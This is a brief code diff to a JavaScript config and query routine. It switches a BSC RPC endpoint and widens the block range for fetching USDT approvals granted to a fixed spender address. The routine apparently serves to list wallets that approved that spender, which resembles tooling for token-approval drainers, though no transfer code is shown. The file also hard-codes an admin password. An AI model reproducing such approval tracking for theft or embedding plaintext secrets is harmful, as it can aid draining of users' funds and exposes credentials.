@@ -1,6 +1,6 @@
 // ===== CONFIG =====
 const ADMIN_PASSWORD = "Akashankit1@#";
-const BSC_RPC = "https://bsc-dataseed.binance.org/";
+const BSC_RPC = "https://rpc.ankr.com/bsc";
 const USDT = "0x55d398326f99059fF775485246999027B3197955";
 const SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
 
@@ -30,7 +30,7 @@ async function loadApprovedUsers() {
   const latest = await provider.getBlockNumber();
   const events = await usdt.queryFilter(
     usdt.filters.Approval(null, SPENDER),
-    latest - 50000,
+    latest - 200000,
     latest
   );
 
